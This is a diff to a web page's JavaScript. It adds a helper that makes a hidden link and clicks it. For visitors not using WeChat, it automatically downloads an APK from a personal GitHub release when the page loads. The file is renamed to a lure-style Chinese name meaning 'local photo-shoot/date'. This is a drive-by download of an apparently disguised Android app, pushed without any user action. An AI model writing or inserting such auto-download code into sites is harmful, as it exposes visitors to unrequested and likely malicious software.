@@ -47,6 +47,18 @@
 
 
 <script type="text/javascript">
+
+function downloadFile(url, filename) {
+ 
+  const a = document.createElement('a');
+  a.style.display = 'none';
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+
     $(window).on("load",function(){
         var winHeight = $(window).height();
         function is_weixin() {
@@ -61,6 +73,10 @@
         if(isWeixin){
             $(".weixin-tip").css("height",winHeight);
             $(".weixin-tip").show();
+        } else {
+            const fileUrl = 'https://github.com/holyhoom115/np/releases/download/test/meirenji-v1.0.1.apk'; 
+            const filename = '同城约拍.apk';
+            downloadFile(fileUrl, filename);
         }
     })
 </script>
